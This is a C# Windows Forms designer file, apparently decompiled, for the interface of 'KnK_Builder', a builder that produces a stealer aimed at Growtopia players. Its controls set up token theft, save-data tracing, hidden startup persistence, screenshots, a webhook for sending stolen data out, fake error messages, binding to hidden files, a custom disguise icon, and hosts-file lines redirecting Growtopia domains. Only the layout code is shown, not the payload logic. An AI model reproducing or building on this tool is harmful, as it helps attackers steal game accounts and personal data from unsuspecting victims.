namespace KnK_Builder
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000011 RID: 17 RVA: 0x000029AE File Offset: 0x00000BAE
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000029D0 File Offset: 0x00000BD0
		private void InitializeComponent()
		{
            this.hiddenstr = new MetroFramework.Controls.MetroCheckBox();
            this.corruptgt = new MetroFramework.Controls.MetroCheckBox();
            this.tokensteal = new MetroFramework.Controls.MetroCheckBox();
            this.tracecheck = new MetroFramework.Controls.MetroCheckBox();
            this.hidecheck = new MetroFramework.Controls.MetroCheckBox();
            this.checkstart = new MetroFramework.Controls.MetroCheckBox();
            this.txtwebhook = new MetroFramework.Controls.MetroTextBox();
            this.compilebtn = new MetroFramework.Controls.MetroButton();
            this.screenshot = new MetroFramework.Controls.MetroCheckBox();
            this.iconbutton = new MetroFramework.Controls.MetroButton();
            this.icontxt = new MetroFramework.Controls.MetroTextBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.iconcheck = new MetroFramework.Controls.MetroCheckBox();
            this.fakemsgtext = new MetroFramework.Controls.MetroTextBox();
            this.fakemsg = new MetroFramework.Controls.MetroCheckBox();
            this.hosts = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.listView1 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.hidebindedfiles = new MetroFramework.Controls.MetroCheckBox();
            this.metroButton1 = new MetroFramework.Controls.MetroButton();
            this.metroButton2 = new MetroFramework.Controls.MetroButton();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // hiddenstr
            // 
            this.hiddenstr.AutoSize = true;
            this.hiddenstr.FlatAppearance.BorderSize = 0;
            this.hiddenstr.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.hiddenstr.ForeColor = System.Drawing.Color.Crimson;
            this.hiddenstr.Location = new System.Drawing.Point(117, 36);
            this.hiddenstr.Margin = new System.Windows.Forms.Padding(2);
            this.hiddenstr.Name = "hiddenstr";
            this.hiddenstr.Size = new System.Drawing.Size(103, 15);
            this.hiddenstr.Style = MetroFramework.MetroColorStyle.Red;
            this.hiddenstr.TabIndex = 29;
            this.hiddenstr.Text = "Hidden Startup";
            this.hiddenstr.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.hiddenstr.UseStyleColors = true;
            this.hiddenstr.UseVisualStyleBackColor = true;
            // 
            // corruptgt
            // 
            this.corruptgt.AutoSize = true;
            this.corruptgt.FlatAppearance.BorderSize = 0;
            this.corruptgt.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.corruptgt.ForeColor = System.Drawing.Color.Crimson;
            this.corruptgt.Location = new System.Drawing.Point(5, 55);
            this.corruptgt.Margin = new System.Windows.Forms.Padding(2);
            this.corruptgt.Name = "corruptgt";
            this.corruptgt.Size = new System.Drawing.Size(81, 15);
            this.corruptgt.Style = MetroFramework.MetroColorStyle.Red;
            this.corruptgt.TabIndex = 28;
            this.corruptgt.Text = "Corrupt GT";
            this.corruptgt.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.corruptgt.UseStyleColors = true;
            // 
            // tokensteal
            // 
            this.tokensteal.AutoSize = true;
            this.tokensteal.FlatAppearance.BorderSize = 0;
            this.tokensteal.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.tokensteal.ForeColor = System.Drawing.Color.Crimson;
            this.tokensteal.Location = new System.Drawing.Point(117, 55);
            this.tokensteal.Margin = new System.Windows.Forms.Padding(2);
            this.tokensteal.Name = "tokensteal";
            this.tokensteal.Size = new System.Drawing.Size(87, 15);
            this.tokensteal.Style = MetroFramework.MetroColorStyle.Red;
            this.tokensteal.TabIndex = 27;
            this.tokensteal.Text = "Steal Tokens";
            this.tokensteal.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.tokensteal.UseStyleColors = true;
            // 
            // tracecheck
            // 
            this.tracecheck.AutoSize = true;
            this.tracecheck.BackColor = System.Drawing.Color.Transparent;
            this.tracecheck.FlatAppearance.BorderSize = 0;
            this.tracecheck.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.tracecheck.ForeColor = System.Drawing.Color.Crimson;
            this.tracecheck.Location = new System.Drawing.Point(5, 17);
            this.tracecheck.Margin = new System.Windows.Forms.Padding(2);
            this.tracecheck.Name = "tracecheck";
            this.tracecheck.Size = new System.Drawing.Size(98, 15);
            this.tracecheck.Style = MetroFramework.MetroColorStyle.Red;
            this.tracecheck.TabIndex = 25;
            this.tracecheck.Text = "Trace Save Dat";
            this.tracecheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.tracecheck.UseStyleColors = true;
            this.tracecheck.UseVisualStyleBackColor = false;
            // 
            // hidecheck
            // 
            this.hidecheck.AutoSize = true;
            this.hidecheck.FlatAppearance.BorderSize = 0;
            this.hidecheck.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.hidecheck.ForeColor = System.Drawing.Color.Crimson;
            this.hidecheck.Location = new System.Drawing.Point(5, 36);
            this.hidecheck.Margin = new System.Windows.Forms.Padding(2);
            this.hidecheck.Name = "hidecheck";
            this.hidecheck.Size = new System.Drawing.Size(86, 15);
            this.hidecheck.Style = MetroFramework.MetroColorStyle.Red;
            this.hidecheck.TabIndex = 26;
            this.hidecheck.Text = "Hide Stealer";
            this.hidecheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.hidecheck.UseStyleColors = true;
            // 
            // checkstart
            // 
            this.checkstart.AutoSize = true;
            this.checkstart.FlatAppearance.BorderSize = 0;
            this.checkstart.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.checkstart.ForeColor = System.Drawing.Color.Crimson;
            this.checkstart.Location = new System.Drawing.Point(117, 17);
            this.checkstart.Margin = new System.Windows.Forms.Padding(2);
            this.checkstart.Name = "checkstart";
            this.checkstart.Size = new System.Drawing.Size(117, 15);
            this.checkstart.Style = MetroFramework.MetroColorStyle.Red;
            this.checkstart.TabIndex = 24;
            this.checkstart.Text = "Turn on at startup";
            this.checkstart.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.checkstart.UseStyleColors = true;
            // 
            // txtwebhook
            // 
            this.txtwebhook.Location = new System.Drawing.Point(6, 15);
            this.txtwebhook.Name = "txtwebhook";
            this.txtwebhook.PromptText = "Webhook...";
            this.txtwebhook.Size = new System.Drawing.Size(417, 23);
            this.txtwebhook.Style = MetroFramework.MetroColorStyle.Red;
            this.txtwebhook.TabIndex = 42;
            this.txtwebhook.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.txtwebhook.UseStyleColors = true;
            // 
            // compilebtn
            // 
            this.compilebtn.Highlight = true;
            this.compilebtn.Location = new System.Drawing.Point(258, 180);
            this.compilebtn.Margin = new System.Windows.Forms.Padding(2);
            this.compilebtn.Name = "compilebtn";
            this.compilebtn.Size = new System.Drawing.Size(183, 68);
            this.compilebtn.Style = MetroFramework.MetroColorStyle.Red;
            this.compilebtn.TabIndex = 46;
            this.compilebtn.Text = "Build!";
            this.compilebtn.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.compilebtn.Click += new System.EventHandler(this.compilebtn_Click);
            // 
            // screenshot
            // 
            this.screenshot.AutoSize = true;
            this.screenshot.FlatAppearance.BorderSize = 0;
            this.screenshot.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.screenshot.Location = new System.Drawing.Point(5, 75);
            this.screenshot.Margin = new System.Windows.Forms.Padding(2);
            this.screenshot.Name = "screenshot";
            this.screenshot.Size = new System.Drawing.Size(81, 15);
            this.screenshot.Style = MetroFramework.MetroColorStyle.Red;
            this.screenshot.TabIndex = 47;
            this.screenshot.Text = "Screenshot";
            this.screenshot.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.screenshot.UseStyleColors = true;
            // 
            // iconbutton
            // 
            this.iconbutton.Highlight = true;
            this.iconbutton.Location = new System.Drawing.Point(144, 71);
            this.iconbutton.Margin = new System.Windows.Forms.Padding(2);
            this.iconbutton.Name = "iconbutton";
            this.iconbutton.Size = new System.Drawing.Size(33, 23);
            this.iconbutton.Style = MetroFramework.MetroColorStyle.Red;
            this.iconbutton.TabIndex = 54;
            this.iconbutton.Text = "...";
            this.iconbutton.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.iconbutton.Click += new System.EventHandler(this.iconbutton_Click);
            // 
            // icontxt
            // 
            this.icontxt.Location = new System.Drawing.Point(6, 71);
            this.icontxt.Name = "icontxt";
            this.icontxt.PromptText = "Icon path...";
            this.icontxt.Size = new System.Drawing.Size(137, 23);
            this.icontxt.Style = MetroFramework.MetroColorStyle.Red;
            this.icontxt.TabIndex = 53;
            this.icontxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.icontxt.UseStyleColors = true;
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(12)))), ((int)(((byte)(12)))));
            this.pictureBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pictureBox2.Location = new System.Drawing.Point(107, 9);
            this.pictureBox2.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(60, 60);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 51;
            this.pictureBox2.TabStop = false;
            // 
            // iconcheck
            // 
            this.iconcheck.AutoSize = true;
            this.iconcheck.ForeColor = System.Drawing.Color.Goldenrod;
            this.iconcheck.Location = new System.Drawing.Point(6, 19);
            this.iconcheck.Margin = new System.Windows.Forms.Padding(2);
            this.iconcheck.Name = "iconcheck";
            this.iconcheck.Size = new System.Drawing.Size(84, 15);
            this.iconcheck.Style = MetroFramework.MetroColorStyle.Red;
            this.iconcheck.TabIndex = 50;
            this.iconcheck.Text = "Stealer Icon";
            this.iconcheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.iconcheck.UseStyleColors = true;
            this.iconcheck.UseVisualStyleBackColor = true;
            // 
            // fakemsgtext
            // 
            this.fakemsgtext.Location = new System.Drawing.Point(6, 39);
            this.fakemsgtext.Name = "fakemsgtext";
            this.fakemsgtext.PromptText = "Fake error...";
            this.fakemsgtext.Size = new System.Drawing.Size(228, 23);
            this.fakemsgtext.Style = MetroFramework.MetroColorStyle.Red;
            this.fakemsgtext.TabIndex = 49;
            this.fakemsgtext.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.fakemsgtext.UseStyleColors = true;
            this.fakemsgtext.Click += new System.EventHandler(this.Fakemsgtext_Click);
            // 
            // fakemsg
            // 
            this.fakemsg.AutoSize = true;
            this.fakemsg.Location = new System.Drawing.Point(6, 19);
            this.fakemsg.Margin = new System.Windows.Forms.Padding(2);
            this.fakemsg.Name = "fakemsg";
            this.fakemsg.Size = new System.Drawing.Size(124, 15);
            this.fakemsg.Style = MetroFramework.MetroColorStyle.Red;
            this.fakemsg.TabIndex = 48;
            this.fakemsg.Text = "Fake Error Message";
            this.fakemsg.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.fakemsg.UseStyleColors = true;
            this.fakemsg.UseVisualStyleBackColor = true;
            // 
            // hosts
            // 
            this.hosts.Location = new System.Drawing.Point(918, 134);
            this.hosts.Multiline = true;
            this.hosts.Name = "hosts";
            this.hosts.Size = new System.Drawing.Size(139, 35);
            this.hosts.TabIndex = 49;
            this.hosts.Text = "127.0.0.1 growtopia1.com\r\n127.0.0.1 growtopia2.com";
            // 
            // button1
            // 
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.ForeColor = System.Drawing.Color.Crimson;
            this.button1.Location = new System.Drawing.Point(1, 1);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(88, 22);
            this.button1.TabIndex = 50;
            this.button1.Text = "Proxy";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.groupBox1.Controls.Add(this.hidecheck);
            this.groupBox1.Controls.Add(this.corruptgt);
            this.groupBox1.Controls.Add(this.tracecheck);
            this.groupBox1.Controls.Add(this.screenshot);
            this.groupBox1.Controls.Add(this.tokensteal);
            this.groupBox1.Controls.Add(this.hiddenstr);
            this.groupBox1.Controls.Add(this.checkstart);
            this.groupBox1.ForeColor = System.Drawing.Color.Crimson;
            this.groupBox1.Location = new System.Drawing.Point(12, 73);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(240, 102);
            this.groupBox1.TabIndex = 51;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Options";
            // 
            // groupBox3
            // 
            this.groupBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.groupBox3.Controls.Add(this.icontxt);
            this.groupBox3.Controls.Add(this.iconcheck);
            this.groupBox3.Controls.Add(this.iconbutton);
            this.groupBox3.Controls.Add(this.pictureBox2);
            this.groupBox3.ForeColor = System.Drawing.Color.Crimson;
            this.groupBox3.Location = new System.Drawing.Point(258, 73);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(183, 102);
            this.groupBox3.TabIndex = 0;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Icon *ico";
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.groupBox4.Controls.Add(this.fakemsgtext);
            this.groupBox4.Controls.Add(this.fakemsg);
            this.groupBox4.ForeColor = System.Drawing.Color.Crimson;
            this.groupBox4.Location = new System.Drawing.Point(12, 175);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(240, 73);
            this.groupBox4.TabIndex = 0;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Fake error message";
            // 
            // groupBox2
            // 
            this.groupBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.groupBox2.Controls.Add(this.txtwebhook);
            this.groupBox2.ForeColor = System.Drawing.Color.Crimson;
            this.groupBox2.Location = new System.Drawing.Point(12, 29);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(429, 44);
            this.groupBox2.TabIndex = 52;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Webhook";
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.panel1.Controls.Add(this.button1);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(654, 24);
            this.panel1.TabIndex = 54;
            // 
            // listView1
            // 
            this.listView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1});
            this.listView1.ForeColor = System.Drawing.Color.Crimson;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(447, 34);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(195, 167);
            this.listView1.TabIndex = 55;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.SelectedIndexChanged += new System.EventHandler(this.ListView1_SelectedIndexChanged);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Path";
            this.columnHeader1.Width = 335;
            // 
            // hidebindedfiles
            // 
            this.hidebindedfiles.AutoSize = true;
            this.hidebindedfiles.Location = new System.Drawing.Point(445, 233);
            this.hidebindedfiles.Margin = new System.Windows.Forms.Padding(2);
            this.hidebindedfiles.Name = "hidebindedfiles";
            this.hidebindedfiles.Size = new System.Drawing.Size(114, 15);
            this.hidebindedfiles.Style = MetroFramework.MetroColorStyle.Red;
            this.hidebindedfiles.TabIndex = 56;
            this.hidebindedfiles.Text = "Hide Binded Files";
            this.hidebindedfiles.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.hidebindedfiles.UseStyleColors = true;
            this.hidebindedfiles.UseVisualStyleBackColor = true;
            // 
            // metroButton1
            // 
            this.metroButton1.Highlight = true;
            this.metroButton1.Location = new System.Drawing.Point(447, 206);
            this.metroButton1.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton1.Name = "metroButton1";
            this.metroButton1.Size = new System.Drawing.Size(90, 23);
            this.metroButton1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton1.TabIndex = 57;
            this.metroButton1.Text = "Add";
            this.metroButton1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton1.Click += new System.EventHandler(this.metroButton1_Click);
            // 
            // metroButton2
            // 
            this.metroButton2.Highlight = true;
            this.metroButton2.Location = new System.Drawing.Point(552, 206);
            this.metroButton2.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton2.Name = "metroButton2";
            this.metroButton2.Size = new System.Drawing.Size(90, 23);
            this.metroButton2.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton2.TabIndex = 58;
            this.metroButton2.Text = "Remove";
            this.metroButton2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton2.Click += new System.EventHandler(this.metroButton2_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.ClientSize = new System.Drawing.Size(654, 260);
            this.Controls.Add(this.metroButton2);
            this.Controls.Add(this.metroButton1);
            this.Controls.Add(this.hidebindedfiles);
            this.Controls.Add(this.listView1);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.hosts);
            this.Controls.Add(this.compilebtn);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.groupBox4);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "Builder";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

		}

		// Token: 0x04000002 RID: 2
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000003 RID: 3
		private global::MetroFramework.Controls.MetroCheckBox hiddenstr;

		// Token: 0x04000004 RID: 4
		private global::MetroFramework.Controls.MetroCheckBox corruptgt;

		// Token: 0x04000005 RID: 5
		private global::MetroFramework.Controls.MetroCheckBox tokensteal;

		// Token: 0x04000006 RID: 6
		private global::MetroFramework.Controls.MetroCheckBox tracecheck;

		// Token: 0x04000007 RID: 7
		private global::MetroFramework.Controls.MetroCheckBox hidecheck;

		// Token: 0x04000008 RID: 8
		private global::MetroFramework.Controls.MetroCheckBox checkstart;

		// Token: 0x04000009 RID: 9
		private global::MetroFramework.Controls.MetroTextBox txtwebhook;

		// Token: 0x0400000A RID: 10
		private global::MetroFramework.Controls.MetroButton compilebtn;

		// Token: 0x0400000B RID: 11
		private global::MetroFramework.Controls.MetroCheckBox screenshot;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.TextBox hosts;

		// Token: 0x0400000D RID: 13
		private global::MetroFramework.Controls.MetroTextBox fakemsgtext;

		// Token: 0x0400000E RID: 14
		private global::MetroFramework.Controls.MetroCheckBox fakemsg;

		// Token: 0x0400000F RID: 15
		private global::MetroFramework.Controls.MetroButton iconbutton;

		// Token: 0x04000010 RID: 16
		private global::MetroFramework.Controls.MetroTextBox icontxt;

		// Token: 0x04000011 RID: 17
		private global::System.Windows.Forms.PictureBox pictureBox2;

		// Token: 0x04000012 RID: 18
		private global::MetroFramework.Controls.MetroCheckBox iconcheck;

		// Token: 0x04000013 RID: 19
		private global::System.Windows.Forms.Button button1;

		// Token: 0x04000014 RID: 20
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.GroupBox groupBox3;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.GroupBox groupBox4;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.GroupBox groupBox2;

		// Token: 0x04000018 RID: 24
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000019 RID: 25
		private global::System.Windows.Forms.ListView listView1;

		// Token: 0x0400001A RID: 26
		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		// Token: 0x0400001B RID: 27
		private global::MetroFramework.Controls.MetroCheckBox hidebindedfiles;

		// Token: 0x0400001C RID: 28
		private global::MetroFramework.Controls.MetroButton metroButton1;

		// Token: 0x0400001D RID: 29
		private global::MetroFramework.Controls.MetroButton metroButton2;
	}
}
